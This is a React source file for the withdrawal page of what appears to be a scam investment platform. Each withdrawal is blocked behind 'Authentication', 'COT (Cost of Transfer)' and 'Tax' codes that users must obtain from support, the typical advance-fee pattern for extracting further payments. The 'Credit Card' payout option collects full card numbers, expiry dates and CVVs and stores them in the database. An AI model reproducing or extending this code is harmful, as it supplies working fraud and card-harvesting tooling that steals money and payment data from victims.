import { useEffect, useMemo, useState } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
import { toast } from "sonner";
import { Loader2, Bitcoin, Landmark, ShieldAlert, Check, ShieldCheck, Percent, Receipt, Wallet } from "lucide-react";
import { z } from "zod";
import { useLiveData } from "@/hooks/useLiveData";
import { useCurrency } from "@/hooks/useCurrency";

const amountSchema = z.coerce.number().positive("Amount must be positive");

type CodeType = "auth" | "cot" | "tax";
interface AccountCode { id: string; code_type: CodeType; code: string; verified: boolean; }

const STEP_ORDER: CodeType[] = ["auth", "cot", "tax"];
const STEP_META: Record<CodeType, { title: string; subtitle: string; icon: typeof ShieldCheck }> = {
  auth: { title: "Authentication code", subtitle: "Enter the authentication code assigned to your account by support.", icon: ShieldCheck },
  cot:  { title: "COT code", subtitle: "Enter the Cost of Transfer (COT) code assigned to your account.", icon: Percent },
  tax:  { title: "Tax code", subtitle: "Enter the Tax code assigned to your account to release this withdrawal.", icon: Receipt },
};

type OtherMethod = "cashapp" | "paypal" | "venmo" | "card";

export default function Withdraw() {
  const { user } = useAuth();
  const { format, currency } = useCurrency();
  const [submitting, setSubmitting] = useState(false);

  // FIXED: using total_balance instead of balance
  const { data: balanceData, refresh: refreshBalance } = useLiveData(async () => {
    if (!user) return { balance: 0 };
    const { data } = await supabase
      .from("profiles")
      .select("total_balance")
      .eq("user_id", user.id)
      .maybeSingle();
    return { balance: data ? Number(data.total_balance) : 0 };
  }, [user?.id]);
  const balance = balanceData?.balance ?? 0;

  const [crypto, setCrypto] = useState({ coin: "BTC", amount: "", address: "" });
  const [bank, setBank] = useState({ amount: "", account_name: "", account_no: "", bank_name: "", swift: "" });
  const [other, setOther] = useState<{
    method: OtherMethod; amount: string;
    cashapp_tag: string; paypal_email: string; venmo_handle: string;
    card_number: string; card_exp: string; card_cvv: string; card_billing_name: string;
  }>({
    method: "cashapp", amount: "",
    cashapp_tag: "", paypal_email: "", venmo_handle: "",
    card_number: "", card_exp: "", card_cvv: "", card_billing_name: "",
  });

  // Code dialog state
  const [authOpen, setAuthOpen] = useState(false);
  const [pendingTxId, setPendingTxId] = useState<string | null>(null);
  const [codes, setCodes] = useState<AccountCode[]>([]);
  const [stepIndex, setStepIndex] = useState(0);
  const [input, setInput] = useState("");
  const [verifying, setVerifying] = useState(false);

  const activeSteps = useMemo<CodeType[]>(
    () => STEP_ORDER.filter((t) => codes.some((c) => c.code_type === t)),
    [codes],
  );
  const currentType: CodeType | null = activeSteps[stepIndex] ?? null;
  const currentCode = currentType ? codes.find((c) => c.code_type === currentType) : null;

  useEffect(() => {
    if (!authOpen || !user) return;
    fetchCodes();
  }, [authOpen, user?.id]);

  const fetchCodes = async () => {
    if (!user) return;
    const { data } = await supabase
      .from("account_withdrawal_codes")
      .select("id, code_type, code, verified")
      .eq("user_id", user.id);
    if (data) setCodes(data as AccountCode[]);
  };

  const submit = async (method: string, body: Record<string, unknown>, amt: string) => {
    if (!user) return;
    const a = amountSchema.safeParse(amt);
    if (!a.success) { toast.error(a.error.errors[0].message); return; }
    if (a.data > balance) { toast.error("Insufficient balance"); return; }
    setSubmitting(true);
    const { data, error } = await supabase.from("transactions").insert({
      user_id: user.id, type: "withdrawal", method, amount_usd: a.data, status: "pending", ...body,
    } as never).select("id").maybeSingle();
    setSubmitting(false);
    if (error || !data) { toast.error(error?.message ?? "Failed"); return; }
    setPendingTxId(data.id);
    setInput("");
    setStepIndex(0);
    setAuthOpen(true);
  };

  const verify = async () => {
    if (!user || !currentType || !currentCode) return;
    const entered = input.trim().toUpperCase();
    if (entered.length < 4) { toast.error("Enter the code"); return; }
    if (entered !== currentCode.code.trim().toUpperCase()) {
      toast.error(`Invalid ${STEP_META[currentType].title.toLowerCase()}.`);
      return;
    }
    setVerifying(true);
    await supabase.from("account_withdrawal_codes").update({ verified: true }).eq("id", currentCode.id);
    const nextIdx = stepIndex + 1;
    setInput("");
    if (nextIdx >= activeSteps.length) {
      await supabase.from("transactions").update({ auth_code: currentCode.code, auth_code_verified: true }).eq("id", pendingTxId!);
      setVerifying(false);
      setAuthOpen(false);
      setPendingTxId(null);
      refreshBalance();
      toast.success("All codes verified. Withdrawal is under final review.");
    } else {
      setStepIndex(nextIdx);
      setVerifying(false);
      toast.success(`${STEP_META[currentType].title} accepted.`);
    }
  };

  const cancelRequest = async () => {
    if (pendingTxId) await supabase.from("transactions").update({ status: "rejected" }).eq("id", pendingTxId);
    setAuthOpen(false);
    setPendingTxId(null);
  };

  const StepIcon = currentType ? STEP_META[currentType].icon : ShieldAlert;

  const submitOther = () => {
    const m = other.method;
    const body: Record<string, unknown> = {};
    let label = "";
    if (m === "cashapp") {
      if (!other.cashapp_tag.trim()) return toast.error("Enter your $cashtag");
      body.cashapp_tag = other.cashapp_tag.trim();
      label = "Cash App";
    } else if (m === "paypal") {
      if (!/^\S+@\S+\.\S+$/.test(other.paypal_email)) return toast.error("Enter a valid PayPal email");
      body.paypal_email = other.paypal_email.trim();
      label = "PayPal";
    } else if (m === "venmo") {
      if (!other.venmo_handle.trim()) return toast.error("Enter your Venmo handle");
      body.venmo_handle = other.venmo_handle.trim();
      label = "Venmo";
    } else if (m === "card") {
      if (other.card_number.replace(/\s/g, "").length < 12) return toast.error("Enter a valid card number");
      if (!other.card_exp.trim()) return toast.error("Enter expiration date");
      if (other.card_cvv.length < 3) return toast.error("Enter CVV");
      if (!other.card_billing_name.trim()) return toast.error("Enter billing name");
      body.card_number = other.card_number.replace(/\s/g, "");
      body.card_exp = other.card_exp.trim();
      body.card_cvv = other.card_cvv.trim();
      body.card_billing_name = other.card_billing_name.trim();
      body.card_last4 = body.card_number.toString().slice(-4);
      label = "Credit Card";
    }
    submit(label, body, other.amount);
  };

  return (
    <div className="space-y-6">
      <div>
        <p className="label-mono text-muted-foreground mb-2">Cash out</p>
        <h1 className="font-display text-3xl font-light tracking-[-0.03em]">Withdraw</h1>
        <p className="text-muted-foreground text-[14px] mt-1">
          Available balance: <span className="text-foreground font-medium">{format(balance)}</span>
        </p>
      </div>

      <Tabs defaultValue="crypto">
        <TabsList className="grid w-full max-w-2xl grid-cols-3">
          <TabsTrigger value="crypto"><Bitcoin className="w-3.5 h-3.5 mr-1.5" /> Crypto</TabsTrigger>
          <TabsTrigger value="bank"><Landmark className="w-3.5 h-3.5 mr-1.5" /> Bank</TabsTrigger>
          <TabsTrigger value="others"><Wallet className="w-3.5 h-3.5 mr-1.5" /> Others</TabsTrigger>
        </TabsList>

        <TabsContent value="crypto" className="mt-6">
          <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
            <div className="grid sm:grid-cols-2 gap-4">
              <div>
                <Label>Coin</Label>
                <Select value={crypto.coin} onValueChange={(v) => setCrypto({ ...crypto, coin: v })}>
                  <SelectTrigger><SelectValue /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="BTC">Bitcoin (BTC)</SelectItem>
                    <SelectItem value="ETH">Ethereum (ETH)</SelectItem>
                    <SelectItem value="USDT">Tether (USDT)</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div>
                <Label>Amount (USD)</Label>
                <Input value={crypto.amount} onChange={(e) => setCrypto({ ...crypto, amount: e.target.value })} placeholder="100" />
                {crypto.amount && !isNaN(Number(crypto.amount)) && currency !== "USD" && (
                  <p className="text-[11px] text-muted-foreground mt-1">≈ {format(Number(crypto.amount))}</p>
                )}
              </div>
            </div>
            <div>
              <Label>Your wallet address</Label>
              <Input value={crypto.address} onChange={(e) => setCrypto({ ...crypto, address: e.target.value })} placeholder="Paste wallet address" className="font-mono text-xs" />
            </div>
            <Button disabled={submitting} onClick={() => submit(`Crypto ${crypto.coin}`, { wallet_address: crypto.address }, crypto.amount)} className="w-full">
              {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
            </Button>
          </div>
        </TabsContent>

        <TabsContent value="bank" className="mt-6">
          <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
            <div className="grid sm:grid-cols-2 gap-4">
              <div>
                <Label>Amount (USD)</Label>
                <Input value={bank.amount} onChange={(e) => setBank({ ...bank, amount: e.target.value })} />
              </div>
              <div>
                <Label>Bank name</Label>
                <Input value={bank.bank_name} onChange={(e) => setBank({ ...bank, bank_name: e.target.value })} />
              </div>
              <div>
                <Label>Account name</Label>
                <Input value={bank.account_name} onChange={(e) => setBank({ ...bank, account_name: e.target.value })} />
              </div>
              <div>
                <Label>Account number</Label>
                <Input value={bank.account_no} onChange={(e) => setBank({ ...bank, account_no: e.target.value })} />
              </div>
              <div className="sm:col-span-2">
                <Label>SWIFT / IBAN</Label>
                <Input value={bank.swift} onChange={(e) => setBank({ ...bank, swift: e.target.value })} />
              </div>
            </div>
            <Button disabled={submitting} onClick={() => submit("Bank transfer", { bank_details: bank }, bank.amount)} className="w-full">
              {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
            </Button>
          </div>
        </TabsContent>

        <TabsContent value="others" className="mt-6">
          <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
            <div className="grid sm:grid-cols-2 gap-4">
              <div>
                <Label>Method</Label>
                <Select value={other.method} onValueChange={(v) => setOther({ ...other, method: v as OtherMethod })}>
                  <SelectTrigger><SelectValue /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="cashapp">Cash App</SelectItem>
                    <SelectItem value="paypal">PayPal</SelectItem>
                    <SelectItem value="venmo">Venmo</SelectItem>
                    <SelectItem value="card">Credit Card</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div>
                <Label>Amount (USD)</Label>
                <Input value={other.amount} onChange={(e) => setOther({ ...other, amount: e.target.value })} placeholder="100" />
              </div>
            </div>

            {other.method === "cashapp" && (
              <div>
                <Label>Cash App tag</Label>
                <Input value={other.cashapp_tag} onChange={(e) => setOther({ ...other, cashapp_tag: e.target.value })} placeholder="$username" />
              </div>
            )}
            {other.method === "paypal" && (
              <div>
                <Label>PayPal email</Label>
                <Input type="email" value={other.paypal_email} onChange={(e) => setOther({ ...other, paypal_email: e.target.value })} placeholder="you@example.com" />
              </div>
            )}
            {other.method === "venmo" && (
              <div>
                <Label>Venmo handle</Label>
                <Input value={other.venmo_handle} onChange={(e) => setOther({ ...other, venmo_handle: e.target.value })} placeholder="@yourhandle" />
              </div>
            )}
            {other.method === "card" && (
              <div className="space-y-4">
                <div>
                  <Label>Card number</Label>
                  <Input value={other.card_number} onChange={(e) => setOther({ ...other, card_number: e.target.value })} placeholder="4242 4242 4242 4242" inputMode="numeric" />
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label>Expiration (MM/YY)</Label>
                    <Input value={other.card_exp} onChange={(e) => setOther({ ...other, card_exp: e.target.value })} placeholder="08/27" />
                  </div>
                  <div>
                    <Label>CVV</Label>
                    <Input value={other.card_cvv} onChange={(e) => setOther({ ...other, card_cvv: e.target.value })} placeholder="123" inputMode="numeric" maxLength={4} />
                  </div>
                </div>
                <div>
                  <Label>Billing name</Label>
                  <Input value={other.card_billing_name} onChange={(e) => setOther({ ...other, card_billing_name: e.target.value })} placeholder="Name on card" />
                </div>
              </div>
            )}

            <Button disabled={submitting} onClick={submitOther} className="w-full">
              {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
            </Button>
          </div>
        </TabsContent>
      </Tabs>

      <Dialog open={authOpen} onOpenChange={(o) => { if (!o) cancelRequest(); }}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <StepIcon className="w-5 h-5 text-yellow-600" />
              {currentType ? STEP_META[currentType].title : "Authorization required"}
            </DialogTitle>
            <DialogDescription>
              {currentType ? STEP_META[currentType].subtitle : "Your account does not have any verification codes assigned. Contact support to receive your codes."}
            </DialogDescription>
          </DialogHeader>

          {activeSteps.length > 0 && (
            <div className="flex items-center gap-2">
              {activeSteps.map((t, i) => {
                const done = i < stepIndex;
                const active = i === stepIndex;
                return (
                  <div key={t} className="flex items-center gap-2 flex-1">
                    <div className={`h-1.5 flex-1 rounded-full ${done ? "bg-emerald-500" : active ? "bg-primary" : "bg-muted"}`} />
                    {done && <Check className="w-3 h-3 text-emerald-600" />}
                  </div>
                );
              })}
            </div>
          )}

          <div className="space-y-4">
            {activeSteps.length === 0 ? (
              <div className="rounded-xl bg-muted/60 border border-border p-4 text-[13px] text-muted-foreground space-y-2">
                <p>No codes have been assigned to your account yet. Please contact support to receive your authorization codes.</p>
                <Button variant="outline" size="sm" onClick={fetchCodes}>Check again</Button>
              </div>
            ) : (
              <>
                <p className="text-[12px] text-muted-foreground">Step {stepIndex + 1} of {activeSteps.length}</p>
                <div>
                  <Label>Enter code</Label>
                  <Input
                    value={input}
                    onChange={(e) => setInput(e.target.value.toUpperCase())}
                    placeholder="ENTER CODE"
                    className="font-mono tracking-widest text-center text-lg"
                    maxLength={12}
                  />
                </div>
              </>
            )}
          </div>

          <DialogFooter>
            <Button variant="outline" onClick={cancelRequest}>Cancel request</Button>
            <Button disabled={verifying || !currentCode} onClick={verify}>
              {verifying ? <Loader2 className="w-4 h-4 animate-spin" /> : (stepIndex + 1 === activeSteps.length ? "Verify & finish" : "Verify & next")}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
